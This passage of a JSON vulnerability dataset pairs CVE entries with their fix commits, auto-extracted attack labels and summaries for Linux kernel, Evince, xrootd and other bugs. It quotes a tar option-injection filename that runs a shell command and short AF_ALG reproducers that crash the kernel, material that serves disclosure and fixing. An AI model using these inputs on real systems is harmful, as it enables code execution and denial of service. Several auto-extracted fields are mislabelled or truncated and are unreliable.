processing L2CAP configuration responses","Impact":"cause a denial of service","Root Cause":"caused by improper bounds checking by the native Bluetooth stack","Attack Type":"remote attacker"},{"commit_id":"befa2e627a5a33a38c92db3e57c07d8246a24acf","cve_id":"CVE-2017-1000215","cwe_id":"CWE-78","commit_message":"secgsi: do not build\/package libXrdSecgsiGMAPLDAP-4.so\n\nThe way the LDAP query is implemented may represent a security threat.\nAny related building and packaging reference is removed.\nThe code is left in place (for the time being) to remind its functionality\nin the case a sanitized version is required.","summary":"ROOT xrootd version 4.6.0 and below is vulnerable to an unauthenticated shell command injection resulting in remote code execution","commit_message_1":"do not build\/package libxrdsecgsigmapldap-<file> the way the ldap query is implemented may represent a security threat","Vulnerability Type":"command injection","Attack Vector":"By sending a specially-crafted request","Impact":"execute arbitrary code","Root Cause":"caused by a flaw","Attack Type":"remote attacker"},{"commit_id":"280a61b300a1614f6037efc0902ff7ecf17146e9","cve_id":"CVE-2017-1000211","cwe_id":"CWE-416","commit_message":"snapshot of project \"lynx\", label v2-8-9dev_15b","summary":"Lynx before 2.8.9dev.16 is vulnerable to a use after free in the HTML parser resulting in memory disclosure, because HTML_put_string() can append a chunk onto itself.","commit_message_1":"snapshot of project `` lynx '' , label v2-<number>-9dev_15b","Vulnerability Type":"Use After Free","Attack Vector":"By sending a specially-crafted HTTP request","Impact":"obtain sensitive information","Root Cause":"caused by a use-after-free","Attack Type":"remote attacker"},{"commit_id":"61bd03e600d2abf309173e9186f4d465bb1b7157","cve_id":"CVE-2017-1000198","cwe_id":"CWE-119","commit_message":"glfs: discard glfs_check_config\n\nSigned-off-by: Prasanna Kumar Kalever <prasanna.kalever@redhat.com>","summary":"tcmu-runner daemon version 0.9.0 to 1.2.0 is vulnerable to invalid memory references in the handler_glfs.so handler resulting in denial of service","commit_message_1":"glfs : discard glfs_check_config","Vulnerability Type":"buffer overflow","Attack Vector":"By using a specially-crafted command","Impact":"cause a denial of service","Root Cause":"caused by an invalid memory reference","Attack Type":"local attacker"},{"commit_id":"717df38fd8509bf883b70d680c9b1b3cf36732ee","cve_id":"CVE-2017-1000083","cwe_id":null,"commit_message":"comics: Remove support for tar and tar-like commands\n\nWhen handling tar files, or using a command with tar-compatible syntax,\nto open comic-book archives, both the archive name (the name of the\ncomics file) and the filename (the name of a page within the archive)\nare quoted to not be interpreted by the shell.\n\nBut the filename is completely with the attacker's control and can start\nwith \"--\" which leads to tar interpreting it as a command line flag.\n\nThis can be exploited by creating a CBT file (a tar archive with the\n.cbt suffix) with an embedded file named something like this:\n\"--checkpoint-action=exec=bash -c 'touch ~\/hacked;'.jpg\"\n\nCBT files are infinitely rare (CBZ is usually used for DRM-free\ncommercial releases, CBR for those from more dubious provenance), so\nremoving support is the easiest way to avoid the bug triggering. All\nthis code was rewritten in the development release for GNOME 3.26 to not\nshell out to any command, closing off this particular attack vector.\n\nThis also removes the ability to use libarchive's bsdtar-compatible\nbinary for CBZ (ZIP), CB7 (7zip), and CBR (RAR) formats. The first two\nare already supported by unzip and 7zip respectively. libarchive's RAR\nsupport is limited, so unrar is a requirement anyway.\n\nDiscovered by Felix Wilhelm from the Google Security Team.\n\nhttps:\/\/bugzilla.gnome.org\/show_bug.cgi?id=784630","summary":"backend\/comics\/comics-document.c (aka the comic book backend) in GNOME Evince before 3.24.1 allows remote attackers to execute arbitrary commands via a .cbt file that is a TAR archive containing a filename beginning with a *--* command-line option substring, as demonstrated by a --checkpoint-action=exec=bash at the beginning of the filename.","commit_message_1":"remove support for tar and tar-like command when handling tar file , or using a command with tar-compatible syntax , to open comic-book archive , both the archive name ( the name of the comic file ) and the filename ( the name of a page within the archive ) are quoted to not be interpreted by the shell","Vulnerability Type":"aka the comic book backend","Attack Vector":"via a . cbt file that is a tar archive containing a filename beginning with a * - - * command - line option substring , as demonstrated by a - - checkpoint - action = exec = bash at the beginning of the filename","Impact":"execute arbitrary commands","Root Cause":"caused by a flaw","Attack Type":"remote attacker"},{"commit_id":"c131187db2d3fa2f8bf32fdf4e9a4ef805168467","cve_id":"CVE-2017-17862","cwe_id":"CWE-20","commit_message":"bpf: fix branch pruning logic\n\nwhen the verifier detects that register contains a runtime constant\nand it's compared with another constant it will prune exploration\nof the branch that is guaranteed not to be taken at runtime.\nThis is all correct, but malicious program may be constructed\nin such a way that it always has a constant comparison and\nthe other branch is never taken under any conditions.\nIn this case such path through the program will not be explored\nby the verifier. It won't be taken at run-time either, but since\nall instructions are JITed the malicious program may cause JITs\nto complain about using reserved fields, etc.\nTo fix the issue we have to track the instructions explored by\nthe verifier and sanitize instructions that are dead at run time\nwith NOPs. We cannot reject such dead code, since llvm generates\nit for valid C code, since it doesn't do as much data flow\nanalysis as the verifier does.\n\nFixes: 17a5267067f3 (\"bpf: verifier (add verifier core)\")\nSigned-off-by: Alexei Starovoitov <ast@kernel.org>\nAcked-by: Daniel Borkmann <daniel@iogearbox.net>\nSigned-off-by: Daniel Borkmann <daniel@iogearbox.net>","summary":"kernel\/bpf\/verifier.c in the Linux kernel through 4.14.8 ignores unreachable code, even though it would still be processed by JIT compilers. This behavior, also considered an improper branch-pruning logic issue, could possibly be used by local users for denial of service.","commit_message_1":"fix branch pruning logic when the verifier detects that register contains a runtime constant and it 's compared with another constant it will prune exploration of the branch that is guaranteed not to be taken at runtime","Vulnerability Type":"Improper Input Validation","Attack Vector":"By sending a specially-crafted request","Impact":"cause a denial of service","Root Cause":"caused by an improper branch-pruning logic issue","Attack Type":"local attacker"},{"commit_id":"ea25f914dc164c8d56b36147ecc86bc65f83c469","cve_id":"CVE-2017-17857","cwe_id":"CWE-119","commit_message":"bpf: fix missing error return in check_stack_boundary()\n\nPrevent indirect stack accesses at non-constant addresses, which would\npermit reading and corrupting spilled pointers.\n\nFixes: f1174f77b50c (\"bpf\/verifier: rework value tracking\")\nSigned-off-by: Jann Horn <jannh@google.com>\nSigned-off-by: Alexei Starovoitov <ast@kernel.org>\nSigned-off-by: Daniel Borkmann <daniel@iogearbox.net>","summary":"The check_stack_boundary function in kernel\/bpf\/verifier.c in the Linux kernel through 4.14.8 allows local users to cause a denial of service (memory corruption) or possibly have unspecified other impact by leveraging mishandling of invalid variable stack read operations.","commit_message_1":"fix missing error return in check_stack_boundary ( ) prevent indirect stack access at non-constant address , which would permit reading and corrupting spilled pointer","Vulnerability Type":"buffer overflow","Attack Vector":"by leveraging mishandling of invalid variable stack read operations","Impact":"cause a denial of service ( memory corruption ) or possibly have unspecified other impact","Root Cause":"caused by a flaw","Attack Type":"local attacker"},{"commit_id":"a5ec6ae161d72f01411169a938fa5f8baea16e8f","cve_id":"CVE-2017-17856","cwe_id":"CWE-119","commit_message":"bpf: force strict alignment checks for stack pointers\n\nForce strict alignment checks for stack pointers because the tracking of\nstack spills relies on it; unaligned stack accesses can lead to corruption\nof spilled registers, which is exploitable.\n\nFixes: f1174f77b50c (\"bpf\/verifier: rework value tracking\")\nSigned-off-by: Jann Horn <jannh@google.com>\nSigned-off-by: Alexei Starovoitov <ast@kernel.org>\nSigned-off-by: Daniel Borkmann <daniel@iogearbox.net>","summary":"kernel\/bpf\/verifier.c in the Linux kernel through 4.14.8 allows local users to cause a denial of service (memory corruption) or possibly have unspecified other impact by leveraging the lack of stack-pointer alignment enforcement.","commit_message_1":"force strict alignment check for stack pointer force strict alignment check for stack pointer because the tracking of stack spill relies on it ; unaligned stack access can lead to corruption of spilled register , which is exploitable","Vulnerability Type":"buffer overflow","Attack Vector":"by leveraging the lack of stack - pointer alignment enforcement","Impact":"cause a denial of service ( memory corruption ) or possibly have unspecified other impact","Root Cause":"caused by a flaw","Attack Type":"local attacker"},{"commit_id":"179d1c5602997fef5a940c6ddcf31212cbfebd14","cve_id":"CVE-2017-17855","cwe_id":"CWE-119","commit_message":"bpf: don't prune branches when a scalar is replaced with a pointer\n\nThis could be made safe by passing through a reference to env and checking\nfor env->allow_ptr_leaks, but it would only work one way and is probably\nnot worth the hassle - not doing it will not directly lead to program\nrejection.\n\nFixes: f1174f77b50c (\"bpf\/verifier: rework value tracking\")\nSigned-off-by: Jann Horn <jannh@google.com>\nSigned-off-by: Alexei Starovoitov <ast@kernel.org>\nSigned-off-by: Daniel Borkmann <daniel@iogearbox.net>","summary":"kernel\/bpf\/verifier.c in the Linux kernel through 4.14.8 allows local users to cause a denial of service (memory corruption) or possibly have unspecified other impact by leveraging improper use of pointers in place of scalars.","commit_message_1":"do n't prune branch when a scalar is replaced with a pointer this could be made safe by passing through a reference to env and checking for env- > allow_ptr_leaks , but it would only work one way and is probably not worth the hassle - not doing it will not directly lead to program rejection","Vulnerability Type":"buffer overflow","Attack Vector":"by leveraging improper use of pointers in place of scalars","Impact":"cause a denial of service ( memory corruption ) or possibly have unspecified other impact","Root Cause":"caused by a flaw","Attack Type":"local attacker"},{"commit_id":"bb7f0f989ca7de1153bd128a40a71709e339fa03","cve_id":"CVE-2017-17854","cwe_id":"CWE-190","commit_message":"bpf: fix integer overflows\n\nThere were various issues related to the limited size of integers used in\nthe verifier:\n - `off + size` overflow in __check_map_access()\n - `off + reg->off` overflow in check_mem_access()\n - `off + reg->var_off.value` overflow or 32-bit truncation of\n   `reg->var_off.value` in check_mem_access()\n - 32-bit truncation in check_stack_boundary()\n\nMake sure that any integer math cannot overflow by not allowing\npointer math with large values.\n\nAlso reduce the scope of \"scalar op scalar\" tracking.\n\nFixes: f1174f77b50c (\"bpf\/verifier: rework value tracking\")\nReported-by: Jann Horn <jannh@google.com>\nSigned-off-by: Alexei Starovoitov <ast@kernel.org>\nSigned-off-by: Daniel Borkmann <daniel@iogearbox.net>","summary":"kernel\/bpf\/verifier.c in the Linux kernel through 4.14.8 allows local users to cause a denial of service (integer overflow and memory corruption) or possibly have unspecified other impact by leveraging unrestricted integer values for pointer arithmetic.","commit_message_1":"fix integer overflow there were various issue related to the limited size of integer used in the verifier : - ` off + size ` overflow in __check_map_access ( ) - ` off + reg- > off ` overflow in check_mem_access ( ) - ` off + reg- > <file> ` overflow or <number>-bit truncation of ` reg- > <file> ` in check_mem_access ( ) - <number>-bit truncation in check_stack_boundary ( ) make sure that any integer math can not overflow by not allowing pointer math with large value","Vulnerability Type":"integer overflow","Attack Vector":"by leveraging unrestricted integer values for pointer arithmetic","Impact":"cause a denial of service ( integer overflow and memory corruption ) or possibly have unspecified other impact","Root Cause":"caused by a flaw","Attack Type":"local attacker"},{"commit_id":"4374f256ce8182019353c0c639bb8d0695b4c941","cve_id":"CVE-2017-17853","cwe_id":"CWE-119","commit_message":"bpf\/verifier: fix bounds calculation on BPF_RSH\n\nIncorrect signed bounds were being computed.\nIf the old upper signed bound was positive and the old lower signed bound was\nnegative, this could cause the new upper signed bound to be too low,\nleading to security issues.\n\nFixes: b03c9f9fdc37 (\"bpf\/verifier: track signed and unsigned min\/max values\")\nReported-by: Jann Horn <jannh@google.com>\nSigned-off-by: Edward Cree <ecree@solarflare.com>\nAcked-by: Alexei Starovoitov <ast@kernel.org>\n[jannh@google.com: changed description to reflect bug impact]\nSigned-off-by: Jann Horn <jannh@google.com>\nSigned-off-by: Alexei Starovoitov <ast@kernel.org>\nSigned-off-by: Daniel Borkmann <daniel@iogearbox.net>","summary":"kernel\/bpf\/verifier.c in the Linux kernel through 4.14.8 allows local users to cause a denial of service (memory corruption) or possibly have unspecified other impact by leveraging incorrect BPF_RSH signed bounds calculations.","commit_message_1":"fix bound calculation on bpf_rsh incorrect signed bound were being computed","Vulnerability Type":"buffer overflow","Attack Vector":"by leveraging incorrect bpf _ rsh signed bounds calculations","Impact":"cause a denial of service ( memory corruption ) or possibly have unspecified other impact","Root Cause":"caused by a flaw","Attack Type":"local attacker"},{"commit_id":"468f6eafa6c44cb2c5d8aad35e12f06c240a812a","cve_id":"CVE-2017-17852","cwe_id":"CWE-119","commit_message":"bpf: fix 32-bit ALU op verification\n\n32-bit ALU ops operate on 32-bit values and have 32-bit outputs.\nAdjust the verifier accordingly.\n\nFixes: f1174f77b50c (\"bpf\/verifier: rework value tracking\")\nSigned-off-by: Jann Horn <jannh@google.com>\nSigned-off-by: Alexei Starovoitov <ast@kernel.org>\nSigned-off-by: Daniel Borkmann <daniel@iogearbox.net>","summary":"kernel\/bpf\/verifier.c in the Linux kernel through 4.14.8 allows local users to cause a denial of service (memory corruption) or possibly have unspecified other impact by leveraging mishandling of 32-bit ALU ops.","commit_message_1":"fix <number>-bit alu op verification <number>-bit alu ops operate on <number>-bit value and have <number>-bit output","Vulnerability Type":"buffer overflow","Attack Vector":"by leveraging mishandling of 32 - bit alu ops","Impact":"cause a denial of service ( memory corruption ) or possibly have unspecified other impact","Root Cause":"caused by a flaw","Attack Type":"local attacker"},{"commit_id":"4dca6ea1d9432052afb06baf2e3ae78188a4410b","cve_id":"CVE-2017-17807","cwe_id":"CWE-862","commit_message":"KEYS: add missing permission check for request_key() destination\n\nWhen the request_key() syscall is not passed a destination keyring, it\nlinks the requested key (if constructed) into the \"default\" request-key\nkeyring.  This should require Write permission to the keyring.  However,\nthere is actually no permission check.\n\nThis can be abused to add keys to any keyring to which only Search\npermission is granted.  This is because Search permission allows joining\nthe keyring.  keyctl_set_reqkey_keyring(KEY_REQKEY_DEFL_SESSION_KEYRING)\nthen will set the default request-key keyring to the session keyring.\nThen, request_key() can be used to add keys to the keyring.\n\nBoth negatively and positively instantiated keys can be added using this\nmethod.  Adding negative keys is trivial.  Adding a positive key is a\nbit trickier.  It requires that either \/sbin\/request-key positively\ninstantiates the key, or that another thread adds the key to the process\nkeyring at just the right time, such that request_key() misses it\ninitially but then finds it in construct_alloc_key().\n\nFix this bug by checking for Write permission to the keyring in\nconstruct_get_dest_keyring() when the default keyring is being used.\n\nWe don't do the permission check for non-default keyrings because that\nwas already done by the earlier call to lookup_user_key().  Also,\nrequest_key_and_link() is currently passed a 'struct key *' rather than\na key_ref_t, so the \"possessed\" bit is unavailable.\n\nWe also don't do the permission check for the \"requestor keyring\", to\ncontinue to support the use case described by commit 8bbf4976b59f\n(\"KEYS: Alter use of key instantiation link-to-keyring argument\") where\n\/sbin\/request-key recursively calls request_key() to add keys to the\noriginal requestor's destination keyring.  (I don't know of any users\nwho actually do that, though...)\n\nFixes: 3e30148c3d52 (\"[PATCH] Keys: Make request-key create an authorisation key\")\nCc: <stable@vger.kernel.org>\t# v2.6.13+\nSigned-off-by: Eric Biggers <ebiggers@google.com>\nSigned-off-by: David Howells <dhowells@redhat.com>","summary":"The KEYS subsystem in the Linux kernel before 4.14.6 omitted an access-control check when adding a key to the current task's *default request-key keyring* via the request_key() system call, allowing a local user to use a sequence of crafted system calls to add keys to a keyring with only Search permission (not Write permission) to that keyring, related to construct_get_dest_keyring() in security\/keys\/request_key.c.","commit_message_1":"add missing permission check for request_key ( ) destination when the request_key ( ) syscall is not passed a destination keyring , it link the requested key ( if constructed ) into the `` default '' request-key keyring","Vulnerability Type":"Missing Authorization","Attack Vector":"By using a sequence of specially-crafted system calls","Impact":"bypass security restrictions","Root Cause":"caused by omitting an access-control check when adding a key to the current task's default request-key keyring","Attack Type":"local attacker"},{"commit_id":"af3ff8045bbf3e32f1a448542e73abb4c8ceb6f1","cve_id":"CVE-2017-17806","cwe_id":"CWE-787","commit_message":"crypto: hmac - require that the underlying hash algorithm is unkeyed\n\nBecause the HMAC template didn't check that its underlying hash\nalgorithm is unkeyed, trying to use \"hmac(hmac(sha3-512-generic))\"\nthrough AF_ALG or through KEYCTL_DH_COMPUTE resulted in the inner HMAC\nbeing used without having been keyed, resulting in sha3_update() being\ncalled without sha3_init(), causing a stack buffer overflow.\n\nThis is a very old bug, but it seems to have only started causing real\nproblems when SHA-3 support was added (requires CONFIG_CRYPTO_SHA3)\nbecause the innermost hash's state is ->import()ed from a zeroed buffer,\nand it just so happens that other hash algorithms are fine with that,\nbut SHA-3 is not.  However, there could be arch or hardware-dependent\nhash algorithms also affected; I couldn't test everything.\n\nFix the bug by introducing a function crypto_shash_alg_has_setkey()\nwhich tests whether a shash algorithm is keyed.  Then update the HMAC\ntemplate to require that its underlying hash algorithm is unkeyed.\n\nHere is a reproducer:\n\n    #include <linux\/if_alg.h>\n    #include <sys\/socket.h>\n\n    int main()\n    {\n        int algfd;\n        struct sockaddr_alg addr = {\n            .salg_type = \"hash\",\n            .salg_name = \"hmac(hmac(sha3-512-generic))\",\n        };\n        char key[4096] = { 0 };\n\n        algfd = socket(AF_ALG, SOCK_SEQPACKET, 0);\n        bind(algfd, (const struct sockaddr *)&addr, sizeof(addr));\n        setsockopt(algfd, SOL_ALG, ALG_SET_KEY, key, sizeof(key));\n    }\n\nHere was the KASAN report from syzbot:\n\n    BUG: KASAN: stack-out-of-bounds in memcpy include\/linux\/string.h:341  [inline]\n    BUG: KASAN: stack-out-of-bounds in sha3_update+0xdf\/0x2e0  crypto\/sha3_generic.c:161\n    Write of size 4096 at addr ffff8801cca07c40 by task syzkaller076574\/3044\n\n    CPU: 1 PID: 3044 Comm: syzkaller076574 Not tainted 4.14.0-mm1+ #25\n    Hardware name: Google Google Compute Engine\/Google Compute Engine, BIOS  Google 01\/01\/2011\n    Call Trace:\n      __dump_stack lib\/dump_stack.c:17 [inline]\n      dump_stack+0x194\/0x257 lib\/dump_stack.c:53\n      print_address_description+0x73\/0x250 mm\/kasan\/report.c:252\n      kasan_report_error mm\/kasan\/report.c:351 [inline]\n      kasan_report+0x25b\/0x340 mm\/kasan\/report.c:409\n      check_memory_region_inline mm\/kasan\/kasan.c:260 [inline]\n      check_memory_region+0x137\/0x190 mm\/kasan\/kasan.c:267\n      memcpy+0x37\/0x50 mm\/kasan\/kasan.c:303\n      memcpy include\/linux\/string.h:341 [inline]\n      sha3_update+0xdf\/0x2e0 crypto\/sha3_generic.c:161\n      crypto_shash_update+0xcb\/0x220 crypto\/shash.c:109\n      shash_finup_unaligned+0x2a\/0x60 crypto\/shash.c:151\n      crypto_shash_finup+0xc4\/0x120 crypto\/shash.c:165\n      hmac_finup+0x182\/0x330 crypto\/hmac.c:152\n      crypto_shash_finup+0xc4\/0x120 crypto\/shash.c:165\n      shash_digest_unaligned+0x9e\/0xd0 crypto\/shash.c:172\n      crypto_shash_digest+0xc4\/0x120 crypto\/shash.c:186\n      hmac_setkey+0x36a\/0x690 crypto\/hmac.c:66\n      crypto_shash_setkey+0xad\/0x190 crypto\/shash.c:64\n      shash_async_setkey+0x47\/0x60 crypto\/shash.c:207\n      crypto_ahash_setkey+0xaf\/0x180 crypto\/ahash.c:200\n      hash_setkey+0x40\/0x90 crypto\/algif_hash.c:446\n      alg_setkey crypto\/af_alg.c:221 [inline]\n      alg_setsockopt+0x2a1\/0x350 crypto\/af_alg.c:254\n      SYSC_setsockopt net\/socket.c:1851 [inline]\n      SyS_setsockopt+0x189\/0x360 net\/socket.c:1830\n      entry_SYSCALL_64_fastpath+0x1f\/0x96\n\nReported-by: syzbot <syzkaller@googlegroups.com>\nCc: <stable@vger.kernel.org>\nSigned-off-by: Eric Biggers <ebiggers@google.com>\nSigned-off-by: Herbert Xu <herbert@gondor.apana.org.au>","summary":"The HMAC implementation (crypto\/hmac.c) in the Linux kernel before 4.14.8 does not validate that the underlying cryptographic hash algorithm is unkeyed, allowing a local attacker able to use the AF_ALG-based hash interface (CONFIG_CRYPTO_USER_API_HASH) and the SHA-3 hash algorithm (CONFIG_CRYPTO_SHA3) to cause a kernel stack buffer overflow by executing a crafted sequence of system calls that encounter a missing SHA-3 initialization.","commit_message_1":"hmac - require that the underlying hash algorithm is unkeyed because the hmac template did n't check that it underlying hash algorithm is unkeyed , trying to use `` hmac ( hmac ( sha3-<number>-generic ) ) '' through af_alg or through keyctl_dh_compute resulted in the inner hmac being used without having been keyed , resulting in sha3_update ( ) being called without sha3_init ( ) , causing a stack buffer overflow","Vulnerability Type":"Out-of-bounds Write","Attack Vector":"By using the AF_ALG-based hash interface (CONFIG_CRYPTO_USER_API_HASH) and the SHA-3 hash algorithm (CONFIG_CRYPTO_SHA3)","Impact":"use the af _ alg - based hash interface ( config _ crypto _ user _ api _ hash ) and the sha - 3 hash algorithm ( config _ crypto _ sha3 ) to cause a kernel stack buffer overflow by executing a crafted sequence of","Root Cause":"does not validate that the underlying cryptographic hash algorithm is unkeyed","Attack Type":"local attacker"},{"commit_id":"ecaaab5649781c5a0effdaf298a925063020500e","cve_id":"CVE-2017-17805","cwe_id":"CWE-20","commit_message":"crypto: salsa20 - fix blkcipher_walk API usage\n\nWhen asked to encrypt or decrypt 0 bytes, both the generic and x86\nimplementations of Salsa20 crash in blkcipher_walk_done(), either when\ndoing 'kfree(walk->buffer)' or 'free_page((unsigned long)walk->page)',\nbecause walk->buffer and walk->page have not been initialized.\n\nThe bug is that Salsa20 is calling blkcipher_walk_done() even when\nnothing is in 'walk.nbytes'.  But blkcipher_walk_done() is only meant to\nbe called when a nonzero number of bytes have been provided.\n\nThe broken code is part of an optimization that tries to make only one\ncall to salsa20_encrypt_bytes() to process inputs that are not evenly\ndivisible by 64 bytes.  To fix the bug, just remove this \"optimization\"\nand use the blkcipher_walk API the same way all the other users do.\n\nReproducer:\n\n    #include <linux\/if_alg.h>\n    #include <sys\/socket.h>\n    #include <unistd.h>\n\n    int main()\n    {\n            int algfd, reqfd;\n            struct sockaddr_alg addr = {\n                    .salg_type = \"skcipher\",\n                    .salg_name = \"salsa20\",\n            };\n            char key[16] = { 0 };\n\n            algfd = socket(AF_ALG, SOCK_SEQPACKET, 0);\n            bind(algfd, (void *)&addr, sizeof(addr));\n            reqfd = accept(algfd, 0, 0);\n            setsockopt(algfd, SOL_ALG, ALG_SET_KEY, key, sizeof(key));\n            read(reqfd, key, sizeof(key));\n    }\n\nReported-by: syzbot <syzkaller@googlegroups.com>\nFixes: eb6f13eb9f81 (\"[CRYPTO] salsa20_generic: Fix multi-page processing\")\nCc: <stable@vger.kernel.org> # v2.6.25+\nSigned-off-by: Eric Biggers <ebiggers@google.com>\nSigned-off-by: Herbert Xu <herbert@gondor.apana.org.au>","summary":"The Salsa20 encryption algorithm in the Linux kernel before 4.14.8 does not correctly handle zero-length inputs, allowing a local attacker able to use the AF_ALG-based skcipher interface (CONFIG_CRYPTO_USER_API_SKCIPHER) to cause a denial of service (uninitialized-memory free and kernel crash) or have unspecified other impact by executing a crafted sequence of system calls that use the blkcipher_walk API. Both the generic implementation (crypto\/salsa20_generic.c) and x86 implementation (arch\/x86\/crypto\/salsa20_glue.c) of Salsa20 were vulnerable.","commit_message_1":"salsa20 - fix blkcipher_walk api usage when asked to encrypt or decrypt <number> byte , both the generic and x86 implementation of salsa20 crash in blkcipher_walk_done ( ) , either when doing 'kfree ( walk- > buffer ) ' or 'free_page ( ( unsigned long ) walk- > page ) ' , because walk- > buffer and walk- > page have not been initialized","Vulnerability Type":"Improper Input Validation","Attack Vector":"by executing a crafted sequence of system calls that use the blkcipher _ walk api . both the generic implementation","Impact":"use the af _ alg - based skcipher interface ( config _ crypto _ user _ api _ skcipher ) to cause a denial of service ( uninitialized - memory free and kernel crash ) or have unspecified other impact","Root Cause":"does not correctly handle zero - length inputs","Attack Type":"local attacker"},{"commit_id":"8f659a03a0ba9289b9aeb9b4470e6fb263d6f483","cve_id":"CVE-2017-17712","cwe_id":"CWE-362","commit_message":"net: ipv4: fix for a race condition in raw_sendmsg\n\ninet->hdrincl is racy, and could lead to uninitialized stack pointer\nusage, so its value should be read only once.\n\nFixes: c008ba5bdc9f (\"ipv4: Avoid reading user iov twice after raw_probe_proto_opt\")\nSigned-off-by: Mohamed Ghannam <simo.ghannam@gmail.com>\nReviewed-by: Eric Dumazet <edumazet@google.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The raw_sendmsg() function in net\/ipv4\/raw.c in the Linux kernel through 4.14.6 has a race condition in inet->hdrincl that leads to uninitialized stack pointer usage; this allows a local user to execute code and gain privileges.","commit_message_1":"ipv4 : fix for a race condition in raw_sendmsg inet- > hdrincl is racy , and could lead to uninitialized stack pointer usage , so it value should be read only once","Vulnerability Type":"Race Condition","Attack Vector":"By sending a specially-crafted request","Impact":"execute code and gain privileges","Root Cause":"caused by a flaw","Attack Type":"local attacker"},{"commit_id":"dd96d671e4d5ae22c6894c302e8996c13f24c45a","cve_id":"CVE-2017-17499","cwe_id":"CWE-416","commit_message":"Added missing return to avoid use after free.","summary":"ImageMagick before 6.9.9-24 and 7.x before 7.0.7-12 has a use-after-free in Magick::Image::read in Magick++\/lib\/Image.cpp.","commit_message_1":"added missing return to avoid use after free","Vulnerability Type":"Use After Free","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by a use-after-free","Attack Type":"remote attacker"},{"commit_id":"1a6a6e462dc2ac6111f9e02c6852ddec4849b887","cve_id":"CVE-2017-17439","cwe_id":"CWE-476","commit_message":"Security: Avoid NULL structure pointer member dereference\n\nThis can happen in the error path when processing malformed AS\nrequests with a NULL client name.  Bug originally introduced on\nFri Feb 13 09:26:01 2015 +0100 in commit:\n\n    a873e21d7c06f22943a90a41dc733ae76799390d\n\n    kdc: base _kdc_fast_mk_error() on krb5_mk_error_ext()\n\nOriginal patch by Jeffrey Altman <jaltman@secure-endpoints.com>","summary":"In Heimdal through 7.4, remote unauthenticated attackers are able to crash the KDC by sending a crafted UDP packet containing empty data fields for client name or realm. The parser would unconditionally dereference NULL pointers in that case, leading to a segmentation fault. This is related to the _kdc_as_rep function in kdc\/kerberos5.c and the der_length_visible_string function in lib\/asn1\/der_length.c.","commit_message_1":"avoid null structure pointer member dereference this can happen in the error path when processing malformed a request with a null client name","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"by sending a crafted udp packet containing empty data fields for client name or realm","Impact":"cause a denial of service ","Root Cause":"caused by a NULL pointer dereference","Attack Type":"remote attacker"},{"commit_id":"58cf31cee7a456057f337b3102a03206d833d5e8","cve_id":"CVE-2017-17081","cwe_id":"CWE-125","commit_message":"avcodec\/x86\/mpegvideodsp: Fix signedness bug in need_emu\n\nFixes: out of array read\nFixes: 3516\/attachment-311488.dat\n\nFound-by: Insu Yun, Georgia Tech.\nTested-by: wuninsu@gmail.com\nSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>","summary":"The gmc_mmx function in libavcodec\/x86\/mpegvideodsp.c in FFmpeg 3.4 does not properly validate widths and heights, which allows remote attackers to cause a denial of service (integer signedness error and out-of-array read) via a crafted MPEG file.","commit_message_1":"avcodec\/x86\/mpegvideodsp : fix signedness bug in need_emu","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted MPEG file","Impact":"to cause a denial of service ( integer signedness error and out - of - array read )","Root Cause":"does not properly validate widths and heights","Attack Type":"remote attacker"},{"commit_id":"ccd5b3235180eef3cfec337df1c8554ab151b5cc","cve_id":"CVE-2017-17053","cwe_id":"CWE-416","commit_message":"x86\/mm: Fix use-after-free of ldt_struct\n\nThe following commit:\n\n  39a0526fb3f7 (\"x86\/mm: Factor out LDT init from context init\")\n\nrenamed init_new_context() to init_new_context_ldt() and added a new\ninit_new_context() which calls init_new_context_ldt().  However, the\nerror code of init_new_context_ldt() was ignored.  Consequently, if a\nmemory allocation in alloc_ldt_struct() failed during a fork(), the\n->context.ldt of the new task remained the same as that of the old task\n(due to the memcpy() in dup_mm()).  ldt_struct's are not intended to be\nshared, so a use-after-free occurred after one task exited.\n\nFix the bug by making init_new_context() pass through the error code of\ninit_new_context_ldt().\n\nThis bug was found by syzkaller, which encountered the following splat:\n\n    BUG: KASAN: use-after-free in free_ldt_struct.part.2+0x10a\/0x150 arch\/x86\/kernel\/ldt.c:116\n    Read of size 4 at addr ffff88006d2cb7c8 by task kworker\/u9:0\/3710\n\n    CPU: 1 PID: 3710 Comm: kworker\/u9:0 Not tainted 4.13.0-rc4-next-20170811 #2\n    Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Bochs 01\/01\/2011\n    Call Trace:\n     __dump_stack lib\/dump_stack.c:16 [inline]\n     dump_stack+0x194\/0x257 lib\/dump_stack.c:52\n     print_address_description+0x73\/0x250 mm\/kasan\/report.c:252\n     kasan_report_error mm\/kasan\/report.c:351 [inline]\n     kasan_report+0x24e\/0x340 mm\/kasan\/report.c:409\n     __asan_report_load4_noabort+0x14\/0x20 mm\/kasan\/report.c:429\n     free_ldt_struct.part.2+0x10a\/0x150 arch\/x86\/kernel\/ldt.c:116\n     free_ldt_struct arch\/x86\/kernel\/ldt.c:173 [inline]\n     destroy_context_ldt+0x60\/0x80 arch\/x86\/kernel\/ldt.c:171\n     destroy_context arch\/x86\/include\/asm\/mmu_context.h:157 [inline]\n     __mmdrop+0xe9\/0x530 kernel\/fork.c:889\n     mmdrop include\/linux\/sched\/mm.h:42 [inline]\n     exec_mmap fs\/exec.c:1061 [inline]\n     flush_old_exec+0x173c\/0x1ff0 fs\/exec.c:1291\n     load_elf_binary+0x81f\/0x4ba0 fs\/binfmt_elf.c:855\n     search_binary_handler+0x142\/0x6b0 fs\/exec.c:1652\n     exec_binprm fs\/exec.c:1694 [inline]\n     do_execveat_common.isra.33+0x1746\/0x22e0 fs\/exec.c:1816\n     do_execve+0x31\/0x40 fs\/exec.c:1860\n     call_usermodehelper_exec_async+0x457\/0x8f0 kernel\/umh.c:100\n     ret_from_fork+0x2a\/0x40 arch\/x86\/entry\/entry_64.S:431\n\n    Allocated by task 3700:\n     save_stack_trace+0x16\/0x20 arch\/x86\/kernel\/stacktrace.c:59\n     save_stack+0x43\/0xd0 mm\/kasan\/kasan.c:447\n     set_track mm\/kasan\/kasan.c:459 [inline]\n     kasan_kmalloc+0xad\/0xe0 mm\/kasan\/kasan.c:551\n     kmem_cache_alloc_trace+0x136\/0x750 mm\/slab.c:3627\n     kmalloc include\/linux\/slab.h:493 [inline]\n     alloc_ldt_struct+0x52\/0x140 